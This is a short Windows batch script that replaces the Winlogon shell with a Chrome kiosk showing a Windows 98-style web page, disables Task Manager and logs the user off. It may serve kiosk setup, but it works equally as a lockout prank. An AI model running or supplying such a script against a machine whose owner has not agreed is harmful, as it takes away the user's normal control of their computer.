@echo off
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /t REG_SZ /d "\"C:\Program Files\Google\Chrome\Application\chrome.exe\" -kiosk https://98.js.org" /f
REG ADD HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /f
REG ADD HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f
logoff
